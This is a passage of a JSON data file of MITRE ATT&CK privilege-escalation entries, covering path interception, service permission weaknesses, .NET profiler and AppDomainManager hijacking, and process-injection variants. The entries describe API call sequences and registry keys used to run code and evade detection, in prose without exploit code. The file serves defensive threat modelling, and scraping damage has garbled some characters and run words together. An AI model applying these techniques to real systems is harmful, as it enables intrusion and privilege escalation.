    "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths[1]and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,C:\\unsafe path with space\\program.exevs.\"C:\\safe path with space\\program.exe\").[2](stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut isC:\\program files\\myapp.exe, an adversary may create a program atC:\\program.exethat will be run instead of the intended program.[3][4]This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:14.796638"
  },
  {
    "technique_id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:18.053371"
  },
  {
    "technique_id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry underHKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,PowerShell, orReg. Access to Registry keys is controlled through access control lists and user permissions.[1][2]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the serviceâ€™s Registry tree. For example, theFailureCommandkey may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.[3][4]ThePerformancekey contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.[5]If thePerformancekey is not already present and if an adversary-controlled user has theCreate Subkeypermission, adversaries may create thePerformancekey in the serviceâ€™s Registry tree to point to a malicious DLL.[6]Adversaries may also add theParameterskey, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.[5][7]Additionally, If adversaries launch their malicious services using svchost.exe, the serviceâ€™s file may be identified usingHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.[2]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:21.315503"
  },
  {
    "technique_id": "T1574.012",
    "name": "COR_PROFILER",
    "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.[1][2]The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where aComponent Object Model(COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.[2]Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook andImpair Defensesprovided by .NET processes.[3][4][5][6][7]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:24.566677"
  },
  {
    "technique_id": "T1574.013",
    "name": "KernelCallbackTable",
    "description": "Adversaries may abuse theKernelCallbackTableof a process to hijack its execution flow in order to run their own payloads.[1][2]TheKernelCallbackTablecan be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process onceuser32.dllis loaded.[3]An adversary may hijack the execution flow of a process using theKernelCallbackTableby replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such asReflective Code LoadingorProcess Injectioninto another process.A pointer to the memory address of theKernelCallbackTablecan be obtained by locating the PEB (ex: via a call to theNtQueryInformationProcess()Native APIfunction).[4]Once the pointer is located, theKernelCallbackTablecan be duplicated, and a function in the table (e.g.,fnCOPYDATA) set to the address of a malicious payload (ex: viaWriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.[1]The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, theKernelCallbackTablemay also be restored to its original state by the rest of the malicious payload.[1]Use of theKernelCallbackTableto hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:27.912548"
  },
  {
    "technique_id": "T1574.014",
    "name": "AppDomainManager",
    "description": "Adversaries may execute their own malicious payloads by hijacking how the .NETAppDomainManagerloads assemblies. The .NET framework uses theAppDomainManagerclass to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exeor.dllbinaries compiled to run as .NET code) may be loaded into an application domain as executable code.[1]Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.[2][3][4]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:31.189423"
  },
  {
    "technique_id": "T1055",
    "name": "Process Injection",
    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:34.585974",
    "subtechniques": [
      {
        "id": "T1055.001",
        "name": "Dynamic-link Library Injection"
      },
      {
        "id": "T1055.002",
        "name": "Portable Executable Injection"
      },
      {
        "id": "T1055.003",
        "name": "Thread Execution Hijacking"
      },
      {
        "id": "T1055.004",
        "name": "Asynchronous Procedure Call"
      },
      {
        "id": "T1055.005",
        "name": "Thread Local Storage"
      },
      {
        "id": "T1055.011",
        "name": "Extra Window Memory Injection"
      },
      {
        "id": "T1055.012",
        "name": "Process Hollowing"
      },
      {
        "id": "T1055.013",
        "name": "Process DoppelgÃ¤nging"
      },
      {
        "id": "T1055.015",
        "name": "ListPlanting"
      }
    ]
  },
  {
    "technique_id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThread(which calls theLoadLibraryAPI responsible for loading the DLL).[1]Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function ofLoadLibrary).[2][1]Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module'sAddressOfEntryPointbefore starting a new thread in the target process.[3]This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:37.962589"
  },
  {
    "technique_id": "T1055.002",
    "name": "Portable Executable Injection",
    "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThreador additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:41.312490"
  },
  {
    "technique_id": "T1055.003",
    "name": "Thread Execution Hijacking",
    "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed viaSuspendThread,VirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1]This is very similar toProcess Hollowingbut targets an existing process rather than creating a process in a suspended state.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:44.650937"
  },
  {
    "technique_id": "T1055.004",
    "name": "Asynchronous Procedure Call",
    "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.APC injection is commonly performed by attaching malicious code to the APC Queue[1]of a process's thread. Queued APC functions are executed when the thread enters an alterable state.[1]A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this pointQueueUserAPCcan be used to invoke a function (such asLoadLibrayApointing to a malicious DLL).A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.[2]AtomBombing[3]is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:48.005030"
  },
  {
    "technique_id": "T1055.005",
    "name": "Thread Local Storage",
    "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a processâ€™ memory space using otherProcess Injectiontechniques such asProcess Hollowing.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:51.346988"
  },
  {
    "technique_id": "T1055.011",
    "name": "Extra Window Memory Injection",
    "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).[1]Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.[2][3]Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the processâ€™s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the processâ€™s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such asWriteProcessMemoryandCreateRemoteThread.[4]More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.[5][6]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:54.700488"
  },
  {
    "technique_id": "T1055.012",
    "name": "Process Hollowing",
    "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such asCreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such asZwUnmapViewOfSectionorNtUnmapViewOfSectionbefore being written to, realigned to the injected code, and resumed viaVirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1][2]This is very similar toThread Local Storagebut creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:04:58.092511"
  },
  {
    "technique_id": "T1055.013",
    "name": "Process DoppelgÃ¤nging",
    "description": "Adversaries may inject malicious code into process via process doppelgÃ¤nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgÃ¤nging is a method of executing arbitrary code in the address space of a separate live process.Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.[1]To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.[2]To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.[3]Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.[4]Adversaries may abuse TxF to a perform a file-less variation ofProcess Injection. Similar toProcess Hollowing, process doppelgÃ¤nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgÃ¤nging's use of TxF also avoids the use of highly-monitored API functions such asNtUnmapViewOfSection,VirtualProtectEx, andSetThreadContext.[4]Process DoppelgÃ¤nging is implemented in 4 steps[4]:Transact â€“ Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.Load â€“ Create a shared section of memory and load the malicious executable.Rollback â€“ Undo changes to original executable, effectively removing malicious code from the file system.Animate â€“ Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgÃ¤nging may evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:01.433331"
  },
  {
    "technique_id": "T1055.015",
    "name": "ListPlanting",
    "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.[1]Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.[2]Information about an application's list-view settings are stored within the process' memory in aSysListView32control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.[3]Adversaries must first copy code into the target processâ€™ memory space, which can be performed various ways including by directly obtaining a handle to theSysListView32child of the victim process window (via Windows API calls such asFindWindowand/orEnumWindows) or otherProcess Injectionmethods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitoredWriteProcessMemoryfunction. For example, an adversary can use thePostMessageand/orSendMessageAPI functions to sendLVM_SETITEMPOSITIONandLVM_GETITEMPOSITIONmessages, effectively copying a payload 2 bytes at a time to the allocated memory.[4]Finally, the payload is triggered by sending theLVM_SORTITEMSmessage to theSysListView32child of the process window, with the payload within the newly allocated buffer passed and executed as theListView_SortItemscallback.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:04.782820"
  },
  {
    "technique_id": "T1053",
    "name": "Scheduled Task/Job",
    "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar toSystem Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:08.074173",
    "subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      }
    ]
  },
  {
    "technique_id": "T1053.002",
    "name": "At",
    "description": "Adversaries may abuse theatutility to perform task scheduling for initial or recurring execution of malicious code. Theatutility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor ofScheduled Task'sschtasksin Windows environments, usingatrequires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running theatcommand, adversaries may also schedule a task withatby directly leveraging theWindows Management InstrumentationWin32_ScheduledJobWMI class.[1]On Linux and macOS,atmay be invoked by the superuser as well as any users added to theat.allowfile. If theat.allowfile does not exist, theat.denyfile is checked. Every username not listed inat.denyis allowed to invokeat. If theat.denyexists and is empty, global use ofatis permitted. If neither file exists (which is often the baseline) only the superuser is allowed to useat.[2]Adversaries may useatto execute programs at system startup or on a scheduled basis forPersistence.atcan also be abused to conduct remoteExecutionas part ofLateral Movementand/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuseatto break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly,atmay also be used forPrivilege Escalationif the binary is allowed to run as superuser viasudo.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:11.429732"
  },
  {
    "technique_id": "T1053.005",
    "name": "Scheduled Task",
    "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. Theschtasksutility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.[1]In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library andWindows Management Instrumentation(WMI) to create a scheduled task. Adversaries may also utilize the Powershell CmdletInvoke-CimMethod, which leverages WMI classPS_ScheduledTaskto create a scheduled task via an XML path.[2]An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar toSystem Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.[3]Adversaries may also create \"hidden\" scheduled tasks (i.e.Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task fromschtasks /queryand the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).[4][5]Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,Indexvalue) within associated registry keys.[6]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:14.829425"
  },
  {
    "technique_id": "T1078",
    "name": "Valid Accounts",
    "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1]Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:18.240051",
    "subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      }
    ]
  },
  {
    "technique_id": "T1078.001",
    "name": "Default Accounts",
    "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolenPrivate Keysor credential materials to legitimately connect to remote environments viaRemote Services.[4]Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account calledvpxuseris created on the ESXi server. If a threat actor is able to compromise this accountâ€™s credentials (for example, viaExploitation for Credential Accesson the vCenter host), they will then have access to the ESXi server.[5][6]",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:21.571196"
  },
  {
    "technique_id": "T1078.002",
    "name": "Domain Accounts",
    "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1]Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such asOS Credential Dumpingor password reuse, allowing access to privileged resources of the domain.",
    "tactic": "Privilege Escalation",
    "tactics": [
      "Privilege Escalation"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:05:24.944714"
  },
  {
    "technique_id": "T1078.003",
    "name": "Local Accounts",
